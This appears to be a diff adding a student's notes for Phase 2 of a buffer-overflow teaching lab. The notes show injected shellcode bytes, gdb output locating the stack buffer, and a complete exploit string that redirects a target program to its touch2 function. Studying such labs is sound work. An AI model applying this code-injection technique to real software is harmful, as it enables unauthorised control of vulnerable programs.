@@ -97,11 +97,135 @@ NICE JOB!
 //                                              Phase 2                                               //
 ////////////////////////////////////////////////////////////////////////////////////////////////////////
 
+// Need to inject a string so that ctarget would execute the touch2 code instead of returning to test
+// Make it appear to touch2 as if I’m passing my cookie (0x4e99cb1b) as the argument
+// the first argument to a function is passed in register %rdi
+// Store the cookie in the %rdi
+
+// Make a phase2.s file to save the cookie to my rdi register and return. 
+// phase2.s includes these 2 lines:
+movq $0x4e99cb1b,%rdi
+retq
+
+// To get the byte representation of my phase2.s code,
+// compile the phase2.s file with gcc and then disassemble it in objdump
+[jieyun@lnxsrv09 ~/target164]$ gcc -c phase2.s
+[jieyun@lnxsrv09 ~/target164]$ objdump -d phase2.o > phase2.d
+
+// My phase2.d file contains this:
+phase2.o:     file format elf64-x86-64
+
+
+Disassembly of section .text:
+
+0000000000000000 <.text>:
+   0:	48 c7 c7 1b cb 99 4e 	mov    $0x4e99cb1b,%rdi
+   7:	c3                   	retq   
+
+// So the byte representation of the assembly code for returning my cookie is “48 c7 c7 1b cb 99 4e c3”
+// This should be the first line of phase2.txt file
+// Now I need to see how much padding to use, and then the address of %rsp, and then the address of the touch2 function.
+
+(gdb) b getbuf
+Breakpoint 1 at 0x401757: file buf.c, line 12.
+(gdb) run
+Starting program: /w/home.05/ee/ugrad/jieyun/target164/ctarget 
+Cookie: 0x4e99cb1b
+
+Breakpoint 1, getbuf () at buf.c:12
+12	buf.c: No such file or directory.
+Missing separate debuginfos, use: debuginfo-install glibc-2.17-196.el7_4.2.x86_64
+(gdb) disas
+Dump of assembler code for function getbuf:
+=> 0x0000000000401757 <+0>:	sub    $0x38,%rsp          // my buffer has 0x38 = 56 bytes of padding, just like it was in phase 1
+   0x000000000040175b <+4>:	mov    %rsp,%idi
+   0x000000000040175e <+7>:	callq  0x40199a <Gets>
+   0x0000000000401763 <+12>:	mov    $0x1,%eax           // stop here to see when %rsp is after Gets function was called
+   0x0000000000401768 <+17>:	add    $0x38,%rsp
+   0x000000000040176c <+21>:	retq   
+End of assembler dump.
+
+(gdb) until *0x401763
+Type string:asdfghjklasdfghjklasdfghjklasdfghjklasdfghjklasdfghjklasdfghjkl
+getbuf () at buf.c:16
+16	in buf.c
+// I typed a string that’s more than 56 characters
+
+(gdb) x/s $rsp
+0x556841c8:	"asdfghjklasdfghjklasdfghjklasdfghjklasdfghjklasdfghjklasdfghjkl"
+
+// This is the address that should be placed into little endian to get “c8 41 68 55 00 00 00 00”
+
+// In my rtarget assembly code, my touch2 function looks like:
+0000000000401799 <touch2>:
+  401799:	48 83 ec 08          	sub    $0x8,%rsp
+  40179d:	89 fe                	mov    %edi,%esi
+  40179f:	c7 05 53 3d 20 00 02 	movl   $0x2,0x203d53(%rip)        # 6054fc <vlevel>
+  4017a6:	00 00 00 
+  4017a9:	3b 3d 55 3d 20 00    	cmp    0x203d55(%rip),%edi        # 605504 <cookie>
+  4017af:	75 1b                	jne    4017cc <touch2+0x33>
+  4017b1:	bf 48 30 40 00       	mov    $0x403048,%edi
+  4017b6:	b8 00 00 00 00       	mov    $0x0,%eax
+  4017bb:	e8 c0 f4 ff ff       	callq  400c80 <printf@plt>
+  4017c0:	bf 02 00 00 00       	mov    $0x2,%edi
+  4017c5:	e8 df 04 00 00       	callq  401ca9 <validate>
+  4017ca:	eb 19                	jmp    4017e5 <touch2+0x4c>
+  4017cc:	bf 70 30 40 00       	mov    $0x403070,%edi
+  4017d1:	b8 00 00 00 00       	mov    $0x0,%eax
+  4017d6:	e8 a5 f4 ff ff       	callq  400c80 <printf@plt>
+  4017db:	bf 02 00 00 00       	mov    $0x2,%edi
+  4017e0:	e8 76 05 00 00       	callq  401d5b <fail>
+  4017e5:	bf 00 00 00 00       	mov    $0x0,%edi
+  4017ea:	e8 01 f6 ff ff       	callq  400df0 <exit@plt>
+
+// My touch2 function address is at 0000000000401799, which in little endian is “99 17 40 00 00 00 00 00”
+
+// So to conclude, my phase2.txt should include:
+48 c7 c7 1b cb 99 4e c3 // return a cookie
+00 00 00 00 00 00 00 00 // 56 bytes of padding
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+c8 41 68 55 00 00 00 00 // %rsp address
+99 17 40 00 00 00 00 00 // touch2 function address
+
+quit gdb
+save my phase2.txt file on Cyberduck
+run through hex2raw
+run ctarget with the phase2.txt string
+
+[jieyun@lnxsrv09 ~/target164]$ ./hex2raw <phase2.txt> raw-phase2.txt
+[jieyun@lnxsrv09 ~/target164]$ ./ctarget < raw-phase2.txt
+Cookie: 0x4e99cb1b
+Type string:Ouch!: You caused a segmentation fault!
+Better luck next time
+FAILED
+
+// Turns out that my padding was incorrect. Delete one line of padding.
+// So to conclude, my phase2.txt should include:
+48 c7 c7 1b cb 99 4e c3 // return a cookie
+00 00 00 00 00 00 00 00 // 56 bytes in total, including the cookie line already
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+c8 41 68 55 00 00 00 00 // %rsp address
+99 17 40 00 00 00 00 00 // touch2 function address
+
+[jieyun@lnxsrv09 ~/target164]$ ./hex2raw <phase2.txt> raw-phase2.txt
+[jieyun@lnxsrv09 ~/target164]$ ./ctarget < raw-phase2.txt
+Cookie: 0x4e99cb1b
+Type string:Touch2!: You called touch2(0x4e99cb1b)
+Valid solution for level 2 with target ctarget
+PASS: Sent exploit string to server to be validated.
+NICE JOB!
 
 
 
-
-
-
-
-
+////////////////////////////////////////////////////////////////////////////////////////////////////////
+//                                              Phase 3                                               //
+////////////////////////////////////////////////////////////////////////////////////////////////////////
